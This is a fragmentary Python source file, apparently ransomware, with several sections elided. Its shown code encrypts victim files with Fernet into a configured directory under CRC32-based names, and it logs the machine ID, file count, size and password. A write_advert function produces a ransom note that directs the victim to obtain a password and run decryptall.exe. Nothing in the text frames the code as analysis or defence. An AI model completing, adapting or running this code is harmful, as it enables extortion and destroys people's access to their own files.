...
import io
import subprocess
from helpers import deb, uprint, get_computer_uid, get_extensions, is_dev, exception, load_config, save_config, config, set_priority, dir_files
...
def crypt_data(data_to_crypt: bytes):
	fernet = Fernet(key)
	file_struct = pack('245s', bytes(str_id_generator(size=245), encoding='utf8')) + bytes('!!!', encoding='utf8') + data_to_crypt
...
def write_advert(file):
	...
	file.write(f"\tafter you get the password you need to execute {config['core']['encryption_dir']}\\decryptall.exe and paste (shift+ins) received password\r\n")
...
if __name__ == '__main__':
	...
	uprint(f"{get_computer_uid()}: starting encryption of {len(files_to_encrypt)} files, {bytes_to_encrypt / 1024.0 / 1024.0:.2f}MB to encrypt, pass: {password}" +
	...
	for file in files_to_encrypt:
		...
		try:
			...
			with open(file, "rb") as f:
				try:
					crypted_file_name = f"{config['core']['encryption_dir']}\\" + hex(binascii.crc32(bytes(file, encoding='utf8'))) + f"-{filename}-crypted"
